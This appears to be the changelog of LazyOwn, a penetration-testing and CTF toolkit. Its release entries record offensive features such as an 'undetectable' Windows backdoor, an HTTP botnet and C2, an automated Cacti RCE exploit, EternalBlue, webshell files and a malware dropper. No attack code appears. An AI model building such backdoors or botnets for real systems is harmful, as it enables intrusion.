  *   * fix(fix): fix in find command \n\n Version: release/0.1.53 \n\n command find documented at commands.md \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 4 00:28:05 2024 -0300 \n\n Hora: 1728012485


### Refactorización

### Otros

  *   * refactor(refactor): refactor de credentials de evilwinrm de psexec, find \n\n Version: release/0.1.52 \n\n new commands cve documented COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 2 00:57:56 2024 -0300 \n\n Hora: 1727841476


### Nuevas características

### Otros

  *   * feat(feat): eternalblue \n\n Version: release/0.1.52 \n\n and scanner in pwntomate tool alias pyautomate coomand \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 1 01:42:32 2024 -0300 \n\n Hora: 1727757752


### Pruebas

### Otros

  *   * test(test): deleting users from ctf game from repo \n\n Version: release/0.1.51 \n\n https://www.youtube.com/watch?v=H9pRwgNw9Ps \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 1 00:06:24 2024 -0300 \n\n Hora: 1727751984


### Otros

### Otros

  *   * feature(feat): new commands and functionalities \n\n Version: release/0.1.51 \n\n ldapsearch, downloader, windapsearchscrapeusers, refactor smbserver all documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 29 03:35:18 2024 -0300 \n\n Hora: 1727591718


### Refactorización

### Otros

  *   * refactor(refactor): smbclient refactor, cme refactor, netexec, refactor, new command pwncat with self inyect, c2 windows client, kerbrute refactor, kussanagi generate payloads and refactor of payload.json now has domain adn subdomain \n\n Version: release/0.1.50 \n\n soon video on youtube :D now you can see https://www.youtube.com/watch?v=9_9vevmmgMg \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - payload1.json - sessions/users.txt - sessions/win/lazybot.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 28 04:04:43 2024 -0300 \n\n Hora: 1727507083


### Nuevas características

### Otros

  *   * feat(feat): new command Shadowsocks \n\n Version: release/0.1.50 \n\n with love to the comunity :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 25 22:59:45 2024 -0300 \n\n Hora: 1727315985


### Otros

### Otros

  *   * feature(feat): now we are vip \n\n Version: release/0.1.49 \n\n  \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - external/install_external.sh - lazyown - payload.json - payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 23 02:57:23 2024 -0300 \n\n Hora: 1727071043


### Nuevas características

### Otros

  *   * feat(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.48 \n\n gitdumper, powershell_cmd_stager, shellcode_search, ligolo \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 22 22:12:21 2024 -0300 \n\n Hora: 1727053941


### Pruebas

### Otros

  *   * test(testing): some test and new resources and externals scripst to download :D \n\n Version: release/0.1.47 \n\n caption and trickster was pwned :P \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 22 20:22:53 2024 -0300 \n\n Hora: 1727047373


### Nuevas características

### Otros

  *   * feat(feat): new cool stuff xD \n\n Version: release/0.1.47 \n\n parse id rsa from 4xura \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 18:29:53 2024 -0300 \n\n Hora: 1726349393


### Nuevas características

### Otros

  *   * feat(win backdoor): undetectable \n\n Version: release/0.1.46 \n\n handcrafted malware undetectable ;) to windows \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 04:55:13 2024 -0300 \n\n Hora: 1726300513


### Correcciones

### Otros

  *   * fix(fix): c2 insecure filename \n\n Version: release/0.1.45 \n\n resolved \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazyc2.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 04:42:54 2024 -0300 \n\n Hora: 1726299774


### Documentación

### Otros

  *   * docs(docs): documented resources, and externals, and one command dr0p1t \n\n Version: release/0.1.44 \n\n documented at COMMANDS.md as an Execute the Dr0p1t tool to create a stealthy malware dropper. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 03:10:13 2024 -0300 \n\n Hora: 1726294213


### Otros

### Otros

  *   * feature(new commands): documented at COMMANDS.md \n\n Version: release/0.1.44 \n\n vscan, shellshock, generate_revshell, alterx, allin. \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - modules/lazyc2.py - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 12 03:37:43 2024 -0300 \n\n Hora: 1726123063


### Otros

### Otros

  *   * feature(feat): new commands: scarecrow, createmail, eyewitness, secretsdump, getuserspns, passwordspray \n\n Version: release/0.1.43 \n\n documented at COMMANDS.md esporalibre.cl \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 11 02:46:35 2024 -0300 \n\n Hora: 1726033595


### Pruebas

### Otros

  *   * test(test): install \n\n Version: release/0.1.42 \n\n dou you seaw [3~pip install requests \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh - requirements.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 11 02:10:10 2024 -0300 \n\n Hora: 1726031410


### Pruebas

### Otros

  *   * test(test): install \n\n Version: release/0.1.42 \n\n testing... \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - requirements.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 10 02:41:23 2024 -0300 \n\n Hora: 1725946883


### Nuevas características

### Otros

  *   * feat(feat): graph \n\n Version: release/0.1.42 \n\n integrated at index2.html :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazynmap.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 10 01:54:21 2024 -0300 \n\n Hora: 1725944061


### Nuevas características

### Otros

  *   * feat(feat): 2 new commands \n\n Version: release/0.1.41 \n\n shellfire, evil_ssdp documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 20:45:20 2024 -0300 \n\n Hora: 1725925520


### Pruebas

### Otros

  *   * test(test): install testing \n\n Version: release/0.1.40 \n\n reported by user \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 09:36:28 2024 -0300 \n\n Hora: 1725885388


### Correcciones urgentes

### Otros

  *   * hotfix(hotfix): install wa broken \n\n Version: release/0.1.40 \n\n infinite loop \n\n Modified file(s):\n- .gitignore - README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 09:25:02 2024 -0300 \n\n Hora: 1725884702


### Pruebas

### Otros

  *   * test(testing): emire \n\n Version: release/0.1.39 \n\n empire xD \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 8 05:35:22 2024 -0300 \n\n Hora: 1725784522


### Pruebas

### Otros

  *   * test(test): veil \n\n Version: release/0.1.39 \n\n new evasion tool testing testing testing \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 8 04:46:46 2024 -0300 \n\n Hora: 1725781606


### Otros

### Otros

  *   * feature(feat): now tord, trace, and generatedic to generate dictionary with params \n\n Version: release/0.1.39 \n\n :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 7 01:41:09 2024 -0400 \n\n Hora: 1725687669


### Pruebas

### Otros

  *   * test(test): testing new feature tord \n\n Version: release/0.1.38 \n\n documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/tor.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Sep 6 03:29:03 2024 -0400 \n\n Hora: 1725607743


### Pruebas

### Otros

  *   * test(test): ivy shellcodes test \n\n Version: release/0.1.38 \n\n new command documented at commands.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Sep 6 02:56:06 2024 -0400 \n\n Hora: 1725605766


### Documentación

### Otros

  *   * docs(docs): new alias \n\n Version: release/0.1.38 \n\n new alias tor documented \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/tor.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:49:22 2024 -0400 \n\n Hora: 1725515362


### Documentación

### Otros

  *   * docs(docs): corrections in text \n\n Version: release/0.1.38 \n\n and some capitals \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:42:38 2024 -0400 \n\n Hora: 1725514958


### Documentación

### Otros

  *   * docs(docs): new links \n\n Version: release/0.1.38 \n\n automatic download link generated by the app \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:22:00 2024 -0400 \n\n Hora: 1725513720


### Documentación

### Otros

  *   * docs(docs): better docs \n\n Version: release/0.1.38 \n\n is zen now :) \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 4 02:31:58 2024 -0400 \n\n Hora: 1725431518


### Nuevas características

### Otros

  *   * feat(fet): msfpc \n\n Version: release/0.1.38 \n\n automation \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 3 01:15:14 2024 -0400 \n\n Hora: 1725340514


### Otros

### Otros

  *   * feature(feat): comandos nuevos documentados en commands.md \n\n Version: release/0.1.37 \n\n davtest y backdoor_factory \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 2 23:34:25 2024 -0400 \n\n Hora: 1725334465


### Otros

### Otros

  *   * feature(feat): new command apache_users & new options -p to use diferents payloads.json \n\n Version: release/0.1.36 \n\n now more oriented to redteams you can run multiple instances with multiple payloads \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - main.py - sessions/users.txt - sessions/win/winp.ps1 - templates/index.html - utils.py\nDeleted file(s):\n- main.py - templates/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 05:45:31 2024 -0400 \n\n Hora: 1725183931


### Documentación

### Otros

  *   * docs(docs): documented malwarebazar \n\n Version: release/0.1.35 \n\n Fetches and displays malware information from the MalwareBazaar API based on the given tag. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:21:33 2024 -0400 \n\n Hora: 1725164493


### Documentación

### Otros

  *   * docs(docs): documentating \n\n Version: release/0.1.35 \n\n functions dacledit and bloodyAD \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:13:39 2024 -0400 \n\n Hora: 1725164019


### Otros

### Otros

  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.35 \n\n kerbrute, dacledit, bloodyAD, evilwinrm, getTGT \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/php/LFI/scan-LFI.php - sessions/php/LFI/uploadshellLFI.php - sessions/php/ar-protable/arabportable.php - sessions/php/jo/bru-jo.php - sessions/php/jo/pass.txt - sessions/php/jo/site.txt - sessions/php/shell/c2.sh - sessions/php/shell/shell.php - sessions/php/user/user.php - sessions/php/wp/wp.php - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 31 06:21:44 2024 -0400 \n\n Hora: 1725099704


### Otros

### Otros

  *   * feature(feat): nuevos comandos documetados en COMMANDS.md \n\n Version: release/0.1.34 \n\n changeme, enum4linux_ng, fuzz, sharpshooter, sliver_server, gencert \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 23:33:30 2024 -0400 \n\n Hora: 1725075210


### Otros

### Otros

  *   * feature(feat): nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.33 \n\n sherlock, trufflehog, weevelygen, weevely \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 03:07:45 2024 -0400 \n\n Hora: 1725001665


### Correcciones urgentes

### Otros

  *   * hotfix(hotfix): deleted the insecure chat \n\n Version: release/0.1.32 \n\n DELETED \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 02:58:04 2024 -0400 \n\n Hora: 1725001084


### Otros

### Otros

  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.31 \n\n parsero, nueclei, dmitry, msfrpc, graudit, cewl, sslscan \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 28 23:02:18 2024 -0400 \n\n Hora: 1724900538


### Otros

### Otros

  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.30 \n\n sqli, sshkey, crunch, malwarebazar, download_malwarebazar, and an easteregg :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 02:47:43 2024 -0400 \n\n Hora: 1724741263


### Correcciones

### Otros

  *   * fix(fix): some fixes in c2 \n\n Version: release/0.1.29 \n\n now curl attack \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 01:53:40 2024 -0400 \n\n Hora: 1724738020


### Nuevas características

### Otros

  *   * feat(kick): to kick from net some ip \n\n Version: release/0.1.28 \n\n seend spoofed packet to kick some ip from our net \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 00:53:52 2024 -0400 \n\n Hora: 1724734432


### Otros

### Otros

  *   * feature(new command c2 documentad at COMMANDS.md): a little botnet over http :) \n\n Version: release/0.1.27 \n\n this is my second aproach the first is a little botnet using sockets, the new it's web :) \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 03:07:21 2024 -0400 \n\n Hora: 1724656041


### Correcciones

### Otros

  *   * fix(fix auto exploit cacti rce logged): now the attack work automated \n\n Version: release/0.1.26 \n\n smoothy \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 02:18:44 2024 -0400 \n\n Hora: 1724653124


### Otros

### Otros

  *   * feature(new commands docummented at COMMANDS.md): waybackmachine, morse, powerserver, shellshock, wifipass, ngrok and smalldic \n\n Version: release/0.1.25 \n\n with love by grisun0 \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/headers.json - modules/lazyseo.py - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 23:28:31 2024 -0400 \n\n Hora: 1724556511


### Otros

### Otros

  *   * feature(2 new attacks): docummented at COMMANDS.md \n\n Version: release/0.1.24 \n\n smbattack and cacti_exploit \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 15:22:18 2024 -0400 \n\n Hora: 1724527338


### Pruebas

### Otros

  *   * test(new machine): monitorsthree.htb \n\n Version: release/0.1.23 \n\n happyhacking \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 03:15:09 2024 -0400 \n\n Hora: 1724483709


### Refactorización

### Otros

  *   * refactor(new payload): in msfvenom \n\n Version: release/0.1.23 \n\n :) java jsp :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 01:45:02 2024 -0400 \n\n Hora: 1724478302


### Nuevas características

### Otros

  *   * feat(new feature): padbuster \n\n Version: release/0.1.23 \n\n new command padbuster documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:11:22 2024 -0400 \n\n Hora: 1724472682


### Documentación

### Otros

  *   * docs(documentacion): nueva versiòn en la web reflejada en el banner \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:03:47 2024 -0400 \n\n Hora: 1724472227


### Documentación

### Otros

  *   * docs(new documentation): better documentation to commands and utils \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:30:32 2024 -0400 \n\n Hora: 1724470232


### Nuevas características

### Otros

  *   * feat(new feat in createdll): new option 3 to run automate create dll blazor malware \n\n Version: release/0.1.22 \n\n this attack its in 2 faces, first run lazymsfvenom or venom, crate shell.elf and you can cratedll option 3 :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/lin/blazormalware.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:13:14 2024 -0400 \n\n Hora: 1724469194


### Correcciones

### Otros

  *   * fix(fix): blazormalware corrected now functional and armed :) \n\n Version: release/0.1.21 \n\n and lanter machine was pwned :P \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - sessions/lin/blazormalware.sh - sessions/win/lazycat.ps1 - sessions/win/rev.c\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 15:28:03 2024 -0400 \n\n Hora: 1724441283


### Documentación

### Otros

  *   * docs(Lang): Translate README.md to English, enhancing clarity and structure for better understanding of the project features and usage. \n\n Version: release/0.1.20 \n\n This commit translates the README.md file into English to make it accessible to a wider audience. The translation maintains the original content's intent while improving clarity and coherence. Additionally, I've structured the document to highlight key features, usage instructions, acknowledgments, and licensing information. This update aims to enhance the overall understanding of the LazyOwn project and its functionalities. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 21 02:25:41 2024 -0400 \n\n Hora: 1724221541


### Nuevas características

### Otros

